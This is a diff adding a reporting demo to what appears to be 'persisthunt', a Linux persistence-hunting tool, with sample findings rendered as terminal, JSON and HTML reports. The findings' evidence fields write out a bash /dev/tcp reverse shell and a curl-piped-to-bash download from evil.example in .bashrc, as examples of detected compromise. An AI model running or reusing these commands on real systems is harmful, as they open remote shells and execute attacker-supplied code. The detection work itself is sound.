@@ -11,6 +11,7 @@ from persisthunt.detectors.suid import SuidDetector
 from persisthunt.detectors.process import ProcessDetector
 from persisthunt.detectors.account import AccountDetector
 from persisthunt.risk import RiskScorer, RiskReport, calculate_risk
+from persisthunt.reporting import ScanReport, Reporter, generate_report
 
 def demo_stage1_findings():
     print("=== Stage 1: Finding Model & Collection Demo ===")
@@ -545,6 +546,67 @@ def demo_stage8_risk_scoring():
     print(host_report.summary())
 
 
+def demo_stage9_reporting():
+    print("\n=== Stage 9: Reporting & JSON Output Demo ===")
+
+    # 1. Generate an audit report for 8 findings matching the specification
+    findings = FindingCollection()
+    findings.add(Finding(
+        id="PH-ACCT-001", category="account", severity=Severity.CRITICAL,
+        title="Non-root user account with UID 0 (root privileges)",
+        description="Account 'toor' possesses UID 0.",
+        evidence="Username: toor, UID: 0", location="/etc/passwd:toor",
+        recommendation="Remove unauthorized UID 0 accounts immediately."
+    ))
+    findings.add(Finding(
+        id="PH-PROC-004", category="process", severity=Severity.HIGH,
+        title="Process command line contains raw socket redirection",
+        description="Process PID 800 contains /dev/tcp syntax.",
+        evidence="/bin/bash -i >& /dev/tcp/198.51.100.1/4444 0>&1", location="PID 800 (bash)",
+        recommendation="Investigate active network connections immediately."
+    ))
+    findings.add(Finding(
+        id="PH-SHELL-002", category="shell", severity=Severity.HIGH,
+        title="Remote download piped directly into shell in startup script",
+        description="curl pipe to bash in .bashrc.",
+        evidence="curl -fsSL https://evil.example/a.sh | bash", location="/home/victim/.bashrc:3",
+        recommendation="Audit startup script remote sources."
+    ))
+    for i in range(3):
+        findings.add(Finding(
+            id=f"PH-CRON-00{i+1}", category="cron", severity=Severity.MEDIUM,
+            title=f"Suspicious cron job execution {i+1}",
+            description="Cron job referencing unusual script path.",
+            evidence=f"/tmp/cron_task_{i+1}.sh", location=f"/etc/cron.d/job_{i+1}",
+            recommendation="Relocate scripts to root-owned system directories."
+        ))
+    for i in range(2):
+        findings.add(Finding(
+            id=f"PH-SYSTEMD-00{i+1}", category="systemd", severity=Severity.LOW,
+            title=f"Systemd service configuration warning {i+1}",
+            description="Minor systemd unit directive anomaly.",
+            evidence="Standard directive review", location=f"/etc/systemd/system/svc{i+1}.service",
+            recommendation="Review unit configuration file."
+        ))
+
+    report = generate_report(findings, host="linux-prod-node-01")
+
+    # 2. Display Human-Readable Terminal Summary
+    print("\n--- Terminal Summary Output ---")
+    print(report.to_terminal(show_details=True))
+
+    # 3. Display Stable JSON Schema Output
+    print("\n--- Machine-Readable JSON Output (Schema Validated) ---")
+    print(report.to_json(indent=2))
+
+    # 4. Generate and Save HTML Report
+    with TemporaryDirectory() as tmpdir:
+        html_dest = Path(tmpdir) / "persisthunt_report.html"
+        saved = report.save_html(html_dest)
+        print(f"\n--- HTML Report Generated ---")
+        print(f"Report saved to: {saved} ({saved.stat().st_size} bytes)")
+
+
 def main():
     demo_stage1_findings()
     demo_stage2_cron_detector()
@@ -554,8 +616,10 @@ def main():
     demo_stage6_suid_detector()
     demo_stage7_process_and_account_detectors()
     demo_stage8_risk_scoring()
+    demo_stage9_reporting()
 
 if __name__ == "__main__":
     main()
+
 
 
